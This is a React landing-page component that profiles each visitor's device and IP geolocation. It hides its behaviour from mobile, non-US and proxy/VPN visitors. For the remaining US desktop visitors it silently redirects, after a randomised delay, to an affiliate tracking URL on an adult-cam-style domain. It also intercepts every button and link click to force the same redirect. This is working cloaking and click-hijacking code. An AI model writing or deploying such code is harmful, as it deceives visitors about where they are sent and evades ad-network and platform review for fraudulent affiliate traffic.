
import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import LiveSection from './components/LiveSection';
import Features from './components/Features';
import Testimonials from './components/Testimonials';
import Footer from './components/Footer';

const App: React.FC = () => {
  const redirectUrl = "https://t.acrsmartcam.com/406599/8873/0?aff_sub5=SF_006OG000004lmDN";
  const [accessStatus, setAccessStatus] = useState<'checking' | 'allowed' | 'blocked_geo' | 'blocked_device' | 'blocked_proxy'>('checking');
  const [allowRedirect, setAllowRedirect] = useState(false);

  useEffect(() => {
    const checkAccess = async () => {
      // 检测设备
      const isDesktop = !/Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
      
      // 获取 IP 信息
      let data: any;
      try {
        const res = await fetch("https://ipapi.co/json");
        data = await res.json();
        console.log("IP data:", data);
      } catch(e) {
        console.warn("IP接口异常，默认不跳转", e);
        data = {};
      }

      // 判断是否美国住宅IP
      const isUS = data.country === "US";
      const proxy = Boolean(data.proxy || data.hosting || data.vpn);

      if (!isDesktop) {
        setAccessStatus('blocked_device');
        setAllowRedirect(false);
        return;
      }

      if (!isUS) {
        setAccessStatus('blocked_geo');
        setAllowRedirect(false);
        return;
      }

      if (proxy) {
        setAccessStatus('blocked_proxy');
        setAllowRedirect(false);
        return;
      }

      // All checks passed
      setAccessStatus('allowed');
      setAllowRedirect(true);

      // 延迟跳转
      const delay = Math.floor(Math.random() * (3500 - 2000 + 1)) + 2000;
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, delay);
    };

    checkAccess();
  }, []);

  // Global click interceptor for all buttons (Unified interception logic)
  useEffect(() => {
    const handleGlobalClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement;
      // 所有按钮点击直接跳转
      const clickable = target.closest('button, .btn, .link, a');
      
      if (clickable) {
        if (allowRedirect) {
          e.preventDefault();
          window.location.href = redirectUrl;
        }
      }
    };

    window.addEventListener('click', handleGlobalClick, true);
    return () => window.removeEventListener('click', handleGlobalClick, true);
  }, [allowRedirect]);

  // Smooth appearance of elements on scroll
  useEffect(() => {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('opacity-100', 'translate-y-0');
            entry.target.classList.remove('opacity-0', 'translate-y-10');
          }
        });
      },
      { threshold: 0.1 }
    );

    document.querySelectorAll('.animate-on-scroll').forEach((el) => observer.observe(el));
    return () => observer.disconnect();
  }, []);

  if (accessStatus === 'checking') {
    return (
      <div className="min-h-screen bg-[#FDFCFB] flex items-center justify-center">
        <div className="w-8 h-8 border-4 border-rose-500 border-t-transparent rounded-full animate-spin"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#FDFCFB] overflow-x-hidden selection:bg-rose-500 selection:text-white text-[#1C1C1C]">
      {accessStatus === 'blocked_geo' && (
        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
          This content is available for US visitors only.
        </div>
      )}
      {accessStatus === 'blocked_device' && (
        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
          Desktop access required to continue.
        </div>
      )}
      {accessStatus === 'blocked_proxy' && (
        <div className="fixed top-0 left-0 w-full bg-[#ff4d4d] text-white py-[10px] text-center z-[9999] font-bold shadow-2xl animate-slide-down">
          Residential US IP required. Proxy/VPN detected.
        </div>
      )}
      
      <Navbar />
      
      <main className="w-full">
        <Hero />
        <LiveSection />
        <Features />
        <Testimonials />
      </main>

      <Footer />
    </div>
  );
};

export default App;
